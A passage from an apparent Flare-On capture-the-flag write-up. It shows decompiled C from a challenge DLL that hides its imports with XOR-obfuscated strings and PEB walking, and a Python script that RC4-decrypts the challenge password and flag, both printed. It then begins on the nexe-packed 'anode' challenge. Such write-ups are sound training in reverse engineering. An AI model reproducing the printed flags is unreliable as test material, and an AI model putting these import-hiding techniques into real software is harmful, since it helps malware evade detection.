</span></span><span class="line"><span class="cl">    <span class="n">func_name</span> <span class="o">=</span> <span class="nf">XOR_17</span><span class="p">((</span><span class="n">byte</span> <span class="o">*</span><span class="p">)</span><span class="n">s_ErvsQ</span><span class="o">~</span><span class="p">{</span><span class="n">r_100150fc</span><span class="p">,(</span><span class="kt">int</span><span class="p">)</span><span class="o">&amp;</span><span class="n">DAT_10015a50</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">ReadFile</span> <span class="o">=</span> <span class="nf">get_proc</span><span class="p">(</span><span class="n">kernel32</span><span class="p">,</span><span class="n">func_name</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">func_name</span> <span class="o">=</span> <span class="nf">XOR_17</span><span class="p">((</span><span class="n">byte</span> <span class="o">*</span><span class="p">)</span><span class="n">s_</span><span class="err">@</span><span class="n">e</span><span class="o">~</span><span class="n">crQ</span><span class="o">~</span><span class="p">{</span><span class="n">r_10015108</span><span class="p">,(</span><span class="kt">int</span><span class="p">)</span><span class="o">&amp;</span><span class="n">DAT_10015a50</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">WriteFile</span> <span class="o">=</span> <span class="nf">get_proc</span><span class="p">(</span><span class="n">kernel32</span><span class="p">,</span><span class="n">func_name</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>The function i call <code>XOR_17</code> is just xoring the strings with 0x17:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">XOR_17</span><span class="p">(</span><span class="n">byte</span> <span class="o">*</span><span class="n">param_1</span><span class="p">,</span><span class="kt">int</span> <span class="n">param_2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">byte</span> <span class="n">bVar1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">iVar2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">iVar3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="n">iVar2</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">bVar1</span> <span class="o">=</span> <span class="o">*</span><span class="n">param_1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">bVar1</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">iVar3</span> <span class="o">=</span> <span class="n">param_2</span> <span class="o">-</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">param_1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">do</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">iVar2</span> <span class="o">=</span> <span class="n">iVar2</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">param_1</span><span class="p">[</span><span class="n">iVar3</span><span class="p">]</span> <span class="o">=</span> <span class="n">bVar1</span> <span class="o">^</span> <span class="mh">0x17</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">param_1</span> <span class="o">=</span> <span class="n">param_1</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">bVar1</span> <span class="o">=</span> <span class="o">*</span><span class="n">param_1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">bVar1</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="n">undefined</span> <span class="o">*</span><span class="p">)(</span><span class="n">iVar2</span> <span class="o">+</span> <span class="n">param_2</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">param_2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>it&rsquo;s easy then to decrypt all those strings:</p>
<pre tabindex="0"><code>&gt;&gt;&gt; xor(&#34;TxyyrtcYvzrsG~gr&#34;, 0x17)
b&#39;ConnectNamedPipe&#39;
</code></pre><p>etc&hellip;</p>
<p>The decrypted string is passed to a function, which will return a pointer to the given function by accessing the PEB-&gt;PEB_LDR_DATA-&gt;InMemoryOrderModuleList and then walking the
export table.</p>
<p>Classic malware technique to hide imports, and build them at runtime.</p>
<p>Following XREF of what we called <code>init_imports</code>, we find a function starting a new thread:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="n">undefined4</span> <span class="nf">DllMain</span><span class="p">(</span><span class="n">undefined4</span> <span class="n">param_1</span><span class="p">,</span><span class="kt">int</span> <span class="n">param_2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">param_2</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">init_imports</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="o">*</span><span class="n">CreateThread</span><span class="p">)(</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">do_stuff_with_pipe</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>the thread will create the named pipe, read 64 bytes from it and call a <code>check_password</code> function:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="n">undefined4</span> <span class="nf">do_stuff_with_pipe</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">hFile</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">iVar1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">undefined4</span> <span class="n">uVar2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">undefined4</span> <span class="n">uVar3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">undefined4</span> <span class="n">uVar4</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">undefined4</span> <span class="n">uVar5</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">undefined4</span> <span class="n">uVar6</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">undefined4</span> <span class="n">uVar7</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">undefined4</span> <span class="n">uVar8</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">undefined</span> <span class="n">lpBuffer</span> <span class="p">[</span><span class="mi">64</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="n">undefined</span> <span class="n">local_10</span> <span class="p">[</span><span class="mi">4</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="n">undefined4</span> <span class="n">local_c</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">lpNumberOfBytesRead</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="nf">_memset</span><span class="p">(</span><span class="n">lpBuffer</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x40</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="o">*</span><span class="n">GetProcessHeap</span><span class="p">)();</span>
</span></span><span class="line"><span class="cl">    <span class="n">uVar8</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">uVar7</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">uVar6</span> <span class="o">=</span> <span class="mh">0x40</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">uVar5</span> <span class="o">=</span> <span class="mh">0x40</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">uVar4</span> <span class="o">=</span> <span class="mh">0xff</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">uVar3</span> <span class="o">=</span> <span class="mi">6</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">uVar2</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                    <span class="cm">/* &#39;\\.\pipe\FlareOn&#39; */</span>
</span></span><span class="line"><span class="cl">    <span class="n">hFile</span> <span class="o">=</span> <span class="nf">XOR_17</span><span class="p">((</span><span class="n">byte</span> <span class="o">*</span><span class="p">)</span><span class="n">s_KK9Kg</span><span class="o">~</span><span class="n">grKQ</span><span class="p">{</span><span class="n">verXy_1001504c</span><span class="p">,(</span><span class="kt">int</span><span class="p">)</span><span class="o">&amp;</span><span class="n">DAT_100159d8</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">hFile</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="n">CreateNamedPipeA</span><span class="p">)(</span><span class="n">hFile</span><span class="p">,</span><span class="n">uVar2</span><span class="p">,</span><span class="n">uVar3</span><span class="p">,</span><span class="n">uVar4</span><span class="p">,</span><span class="n">uVar5</span><span class="p">,</span><span class="n">uVar6</span><span class="p">,</span><span class="n">uVar7</span><span class="p">,</span><span class="n">uVar8</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">hFile</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">iVar1</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="n">ConnectNamedPipe</span><span class="p">)(</span><span class="n">hFile</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="p">(</span><span class="o">*</span><span class="n">GetLastError</span><span class="p">)();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="n">iVar1</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="n">ReadFile</span><span class="p">)(</span><span class="n">hFile</span><span class="p">,</span><span class="n">lpBuffer</span><span class="p">,</span><span class="mh">0x40</span><span class="p">,</span><span class="o">&amp;</span><span class="n">lpNumberOfBytesRead</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">((</span><span class="n">iVar1</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="n">lpNumberOfBytesRead</span> <span class="o">==</span> <span class="mi">0</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="p">(</span><span class="o">*</span><span class="n">GetLastError</span><span class="p">)();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="p">(</span><span class="o">*</span><span class="n">FlushFileBuffers</span><span class="p">)(</span><span class="n">hFile</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">lpBuffer</span><span class="p">[</span><span class="n">lpNumberOfBytesRead</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nf">check_password</span><span class="p">(</span><span class="n">lpBuffer</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_c</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">(</span><span class="o">*</span><span class="n">WriteFile</span><span class="p">)(</span><span class="n">hFile</span><span class="p">,</span><span class="n">lpBuffer</span><span class="p">,</span><span class="n">local_c</span><span class="p">,</span><span class="n">local_10</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="o">*</span><span class="n">FlushFileBuffers</span><span class="p">)(</span><span class="n">hFile</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="o">*</span><span class="n">DisconnectNamedPipe</span><span class="p">)(</span><span class="n">hFile</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="o">*</span><span class="n">CloseHandle</span><span class="p">)(</span><span class="n">hFile</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p><code>check_password</code> will initialize a RC4 keystream using the key <code>{ 0x55, 0x8b, 0xec, 0x83, 0xec, 0x20, 0xeb, 0xfe }</code>, use it to decrypt the password and then decrypt the flag.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">bool</span> <span class="kr">__cdecl</span> <span class="nf">check_password</span><span class="p">(</span><span class="n">undefined4</span> <span class="n">password</span><span class="p">,</span><span class="n">undefined4</span> <span class="o">*</span><span class="n">param_2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">iVar1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">byte</span> <span class="o">*</span><span class="n">pbVar2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">uint</span> <span class="n">local_40c</span> <span class="p">[</span><span class="mi">258</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">rc4_init</span><span class="p">(</span><span class="n">local_40c</span><span class="p">,(</span><span class="kt">int</span><span class="p">)</span><span class="n">RC4KEY</span><span class="p">,</span><span class="mi">8</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">rc4_crypt</span><span class="p">(</span><span class="n">local_40c</span><span class="p">,(</span><span class="kt">int</span><span class="p">)</span><span class="n">PASSWORD</span><span class="p">,</span><span class="mi">9</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">iVar1</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="n">lstrcmpA</span><span class="p">)(</span><span class="n">PASSWORD</span><span class="p">,</span><span class="n">password</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">pbVar2</span> <span class="o">=</span> <span class="n">FLAG</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nf">rc4_crypt</span><span class="p">(</span><span class="n">local_40c</span><span class="p">,(</span><span class="kt">int</span><span class="p">)</span><span class="n">FLAG</span><span class="p">,</span><span class="mh">0x1f</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="o">*</span><span class="n">param_2</span> <span class="o">=</span> <span class="mh">0x1f</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="o">*</span><span class="n">param_2</span> <span class="o">=</span> <span class="mh">0x15</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                    <span class="cm">/* b&#39;Authorization Failed&#39; */</span>
</span></span><span class="line"><span class="cl">        <span class="n">pbVar2</span> <span class="o">=</span> <span class="p">(</span><span class="n">byte</span> <span class="o">*</span><span class="p">)</span><span class="nf">XOR_17</span><span class="p">((</span><span class="n">byte</span> <span class="o">*</span><span class="p">)</span><span class="n">s_Vbc_xe</span><span class="o">~</span><span class="n">mvc</span><span class="o">~</span><span class="n">xy7Qv</span><span class="o">~</span><span class="p">{</span><span class="n">rs_10015034</span><span class="p">,(</span><span class="kt">int</span><span class="p">)</span><span class="o">&amp;</span><span class="n">DAT_100159d8</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="o">*</span><span class="n">g_strcpy</span><span class="p">)(</span><span class="n">password</span><span class="p">,</span><span class="n">pbVar2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">iVar1</span> <span class="o">==</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>We can replicate that in python:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">ARC4</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">RC4KEY</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x55\x8b\xec\x83\xec\x20\xeb\xfe</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">PASSWORD</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x3e\x39\x51\xfb\xa2\x11\xf7\xb9\x2c</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">FLAG</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\xe1\x60\xa1\x18\x93\x2e\x96\xad\x73\xbb\x4a\x92\xde\x18\x0a\xaa\x41\x74\xad\xc0\x1d\x9f\x3f\x19\xff\x2b\x02\xdb\xd1\xcd\x1a</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">c</span> <span class="o">=</span> <span class="n">ARC4</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">RC4KEY</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#do not re-init the stream</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">c</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">PASSWORD</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">c</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">FLAG</span><span class="p">))</span>
</span></span></code></pre></div><p>this gives use the password and the flag:</p>
<pre tabindex="0"><code> python slv.py
b&#39;MyV0ic3!\x00&#39;
b&#39;M1x3d_M0dE_4_l1f3@flare-on.com\x00&#39;
</code></pre><h1 id="7-anode">7. anode</h1>
<h2 id="71-challenge-prompt">7.1 Challenge Prompt</h2>
<p>You&rsquo;ve made it so far! I can&rsquo;t believe it! And so many people are ahead of you!</p>
<h2 id="72-solution">7.2 Solution</h2>
<p>We&rsquo;re getting a big fat 55MB binary which after poking a bit with a stick, turns out to be a javascript script, packed with <a href="https://github.com/nexe/nexe">nexe</a>.</p>
<p>If we run <code>strings</code> on it we can actually see the script at the end along with the <code>&lt;nexe~~sentinel&gt;</code> marker.</p>
<p>Unpacking (such big word&hellip;) the script using some random nexe unpacker or even with <code>strings</code>, we&rsquo;re left with something like that:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">readline</span><span class="p">.</span><span class="nx">question</span><span class="p">(</span><span class="sb">`Enter flag: `</span><span class="p">,</span> <span class="nx">flag</span> <span class="p">=&gt;</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">  <span class="nx">readline</span><span class="p">.</span><span class="nx">close</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nx">flag</span><span class="p">.</span><span class="nx">length</span> <span class="o">!==</span> <span class="mi">44</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;Try again.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">process</span><span class="p">.</span><span class="nx">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="kd">var</span> <span class="nx">b</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">flag</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">b</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">flag</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="nx">i</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c1">// something strange is happening...
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">if</span> <span class="p">(</span><span class="mi">1</span><span class="nx">n</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;uh-oh, math is too correct...&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">process</span><span class="p">.</span><span class="nx">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="kd">var</span> <span class="nx">state</span> <span class="o">=</span> <span class="mi">1337</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span><span class="kc">true</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">state</span> <span class="o">^=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">floor</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">()</span> <span class="o">*</span> <span class="p">(</span><span class="mi">2</span><span class="o">**</span><span class="mi">30</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="k">switch</span> <span class="p">(</span><span class="nx">state</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">case</span> <span class="mi">306211</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">()</span> <span class="o">&lt;</span> <span class="mf">0.5</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="nx">b</span><span class="p">[</span><span class="mi">30</span><span class="p">]</span> <span class="o">-=</span> <span class="nx">b</span><span class="p">[</span><span class="mi">34</span><span class="p">]</span> <span class="o">+</span> <span class="nx">b</span><span class="p">[</span><span class="mi">23</span><span class="p">]</span> <span class="o">+</span> <span class="nx">b</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">+</span> <span class="nx">b</span><span class="p">[</span><span class="mi">37</span><span class="p">]</span> <span class="o">+</span> <span class="nx">b</span><span class="p">[</span><span class="mi">33</span><span class="p">]</span> <span class="o">+</span> <span class="nx">b</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="o">+</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">floor</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">()</span> <span class="o">*</span> <span class="mi">256</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">          <span class="nx">b</span><span class="p">[</span><span class="mi">30</span><span class="p">]</span> <span class="o">&amp;=</span> <span class="mh">0xFF</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="nx">b</span><span class="p">[</span><span class="mi">26</span><span class="p">]</span> <span class="o">-=</span> <span class="nx">b</span><span class="p">[</span><span class="mi">24</span><span class="p">]</span> <span class="o">+</span> <span class="nx">b</span><span class="p">[</span><span class="mi">41</span><span class="p">]</span> <span class="o">+</span> <span class="nx">b</span><span class="p">[</span><span class="mi">13</span><span class="p">]</span> <span class="o">+</span> <span class="nx">b</span><span class="p">[</span><span class="mi">43</span><span class="p">]</span> <span class="o">+</span> <span class="nx">b</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">+</span> <span class="nx">b</span><span class="p">[</span><span class="mi">30</span><span class="p">]</span> <span class="o">+</span> <span class="mi">225</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">          <span class="nx">b</span><span class="p">[</span><span class="mi">26</span><span class="p">]</span> <span class="o">&amp;=</span> <span class="mh">0xFF</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nx">state</span> <span class="o">=</span> <span class="mi">868071080</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">continue</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="k">case</span> <span class="mi">311489</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">()</span> <span class="o">&lt;</span> <span class="mf">0.5</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="nx">b</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">-=</span> <span class="nx">b</span><span class="p">[</span><span class="mi">32</span><span class="p">]</span> <span class="o">+</span> <span class="nx">b</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="nx">b</span><span class="p">[</span><span class="mi">20</span><span class="p">]</span> <span class="o">+</span> <span class="nx">b</span><span class="p">[</span><span class="mi">30</span><span class="p">]</span> <span class="o">+</span> <span class="nx">b</span><span class="p">[</span><span class="mi">23</span><span class="p">]</span> <span class="o">+</span> <span class="nx">b</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">+</span> <span class="mi">115</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">          <span class="nx">b</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">&amp;=</span> <span class="mh">0xFF</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="nx">b</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">^=</span> <span class="p">(</span><span class="nx">b</span><span class="p">[</span><span class="mi">18</span><span class="p">]</span> <span class="o">+</span> <span class="nx">b</span><span class="p">[</span><span class="mi">14</span><span class="p">]</span> <span class="o">+</span> <span class="nx">b</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="o">+</span> <span class="nx">b</span><span class="p">[</span><span class="mi">25</span><span class="p">]</span> <span class="o">+</span> <span class="nx">b</span><span class="p">[</span><span class="mi">31</span><span class="p">]</span> <span class="o">+</span> <span class="nx">b</span><span class="p">[</span><span class="mi">21</span><span class="p">]</span> <span class="o">+</span> <span class="mi">19</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nx">state</span> <span class="o">=</span> <span class="mi">22167546</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">continue</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// snipp... there&#39;s 1025 case statement
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">      <span class="k">default</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;uh-oh, math.random() is too random...&#34;</span><span class="p">);</span>
